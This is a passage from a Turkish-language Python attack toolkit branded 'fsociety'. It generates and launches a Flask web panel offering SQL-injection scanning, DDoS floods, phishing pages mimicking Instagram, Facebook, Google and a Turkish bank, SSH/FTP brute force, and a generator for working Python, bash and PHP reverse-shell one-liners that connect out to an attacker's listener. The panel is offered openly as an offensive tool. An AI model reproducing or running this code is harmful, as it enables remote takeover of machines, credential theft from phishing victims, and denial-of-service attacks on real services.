<button onclick="runTool()">BAŞLAT</button>
</div>
<div class="output" id="output">Çıktı burada görünecek...</div>
</div>
</div>
</div>
<script>
function switchTab(tab){{
document.querySelectorAll('.menu-item').forEach(el=>el.classList.remove('active'));
event.target.classList.add('active');
const titles={{{{web:'🌐 Web Tarama + SQLi',ddos:'⚡ DDoS Stres Testi',phish:'🎣 Phishing Paneli',brute:'🔑 Brute Force',osint:'🔍 OSINT Bilgi Toplama',shell:'🐚 Reverse Shell Oluşturucu'}}}};
document.getElementById('tabTitle').textContent=titles[tab];
const options={{{{web:'<input type=\"text\" id=\"target\" placeholder=\"Hedef URL\"><select id=\"option\"><option value=\"web_tara\">Web tarama</option><option value=\"sqli\">SQL Injection</option><option value=\"her_sey\">Tüm testler</option></select>',ddos:'<input type=\"text\" id=\"target\" placeholder=\"Hedef IP\"><input type=\"number\" id=\"port\" placeholder=\"Port\" value=\"80\"><input type=\"number\" id=\"sure\" placeholder=\"Süre(sn)\" value=\"30\"><select id=\"option\"><option value=\"http\">HTTP Flood</option><option value=\"syn\">SYN Flood</option><option value=\"udp\">UDP Flood</option></select>',phish:'<select id=\"option\"><option value=\"instagram\">Instagram</option><option value=\"facebook\">Facebook</option><option value=\"google\">Google</option><option value=\"bank\">Türk Bankası</option></select>',brute:'<input type=\"text\" id=\"target\" placeholder=\"Hedef IP\"><select id=\"option\"><option value=\"ssh\">SSH (22)</option><option value=\"ftp\">FTP (21)</option></select>',osint:'<input type=\"text\" id=\"target\" placeholder=\"Hedef domain\">',shell:'<input type=\"text\" id=\"target\" placeholder=\"Dinleyici IP\"><input type=\"number\" id=\"port\" placeholder=\"Port\" value=\"4444\"><select id=\"option\"><option value=\"python\">Python</option><option value=\"bash\">Bash</option><option value=\"php\">PHP</option></select>'}}}};
document.getElementById('tabContent').innerHTML=options[tab]+'<button onclick=\"runTool()\">BAŞLAT</button>';
}}
async function runTool(){{
const btn=event.target;
btn.disabled=true;
btn.textContent='ÇALIŞIYOR...';
const tab=document.querySelector('.menu-item.active').textContent.trim().split(' ')[0].replace(/[^a-z]/gi,'').toLowerCase();
const target=document.getElementById('target')?.value||'';
const port=document.getElementById('port')?.value||'';
const sure=document.getElementById('sure')?.value||'';
const option=document.getElementById('option')?.value||'';
document.getElementById('output').textContent='[+] Çalıştırılıyor...';
try{{
const res=await fetch('/run',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{tab,target,port,sure,option}})}});
const data=await res.json();
document.getElementById('output').textContent=data.output;
}}catch(e){{
document.getElementById('output').textContent='[!] Hata: '+e;
}}
btn.disabled=false;
btn.textContent='BAŞLAT';
}}
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/run', methods=['POST'])
def run():
    data = request.json
    tab = data.get('tab','web')
    target = data.get('target','')
    port = data.get('port','80')
    sure = data.get('sure','30')
    option = data.get('option','web_tara')
    
    try:
        if tab == 'web':
            if option == 'web_tara' or option == 'her_sey':
                # Admin panel tara
                result = ""
                paneller = ['admin','login','panel','yonetici','yonetim','dashboard']
                for p in paneller:
                    try:
                        req = urllib.request.Request(f"{{{{target}}}}/{{{{p}}}}/", headers={{'User-Agent':'Mozilla/5.0'}})
                        resp = urllib.request.urlopen(req, timeout=3)
                        if resp.getcode() != 404:
                            result += f"[BULUNDU] {{target}}/{{p}}/ -> HTTP {{resp.getcode()}}\\n"
                    except:
                        pass
                if not result:
                    result = "[-] Admin panel bulunamadı\\n"
                return jsonify({{'output': result}})
        
        elif tab == 'ddos':
            return jsonify({{'output': f'[+] DDoS testi başlatıldı: {target}:{port} ({sure} sn)\\n[+] Terminalden devam edin.'}})
        
        elif tab == 'osint':
            ip = socket.gethostbyname(target)
            return jsonify({{'output': f'[+] IP: {ip}\\n[+] Host: {socket.gethostbyaddr(ip)[0]}\\n[+] Bilgi toplama tamamlandı.'}})
        
        elif tab == 'shell':
            kodlar = {{
                'python': f'python3 -c \\"import socket,subprocess,os;s=socket.socket();s.connect((\\\\\\"{target}\\\\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\",\\"-i\\"])\\"',
                'bash': f'bash -i >& /dev/tcp/{target}/{port} 0>&1',
                'php': f'php -r \\"\\$sock=fsockopen(\\\\\\"{target}\\\\\\",{port});exec(\\"/bin/bash -i <&3 >&3 2>&3\\");\\"'
            }}
            return jsonify({{'output': kodlar.get(option, kodlar['python'])}})
        
        return jsonify({{'output': f'[+] {tab} modülü çalıştırıldı'}})
    except Exception as e:
        return jsonify({{'output': f'[!] Hata: {{str(e)}}'}})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int({port}), debug=False)
''')
    
    # Flask kurulumu
    os.system("pip install flask > /dev/null 2>&1")
    
    print(f"{G}[+] Web GUI panel oluşturuldu: {web_dir}/{N}")
    print(f"{Y}[*] Başlatmak için:{N}")
    print(f"{G}    cd {web_dir} && python app.py{N}")
    print(f"{Y}[*] Erişim: http://localhost:{port}{N}")
    
    baslat = input(f"\n{Y}[?] Panel şimdi başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Web panel başlatılıyor...{N}")
        subprocess.Popen(f"cd {web_dir} && python app.py", shell=True)
        print(f"{G}[+] Panel http://localhost:{port} adresinde aktif!{N}")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ANA PROGRAM =====================
def main():
    try:
        while True:
            banner()
            secim = input(f"{Y}{BOLD}[?] Seçiminiz [0-9]: {N}")
            
            if secim == '1':
                web_sqli()
            elif secim == '2':
                ddos_test()
            elif secim == '3':
                phishing_panel()
            elif secim == '4':
                brute_force()
            elif secim == '5':
                osint_tool()
            elif secim == '6':
                reverse_shell()
            elif secim == '7':
                metasploit_entegre()
            elif secim == '8':
                otomatik_kurulum()
            elif secim == '9':
                web_gui_panel()
            elif secim == '0':
                print(f"\n{R}[!] Çıkılıyor...{N}")
                print(f"{G}[+] Bye bye fsociety...{N}")
                sys.exit(0)
            else:
                print(f"{R}[!] Geçersiz seçim!{N}")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Kullanıcı çıkışı...{N}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Hata: {e}{N}")
        input("Devam etmek için Enter...")
        main()

if __name__ == "__main__":
    main()
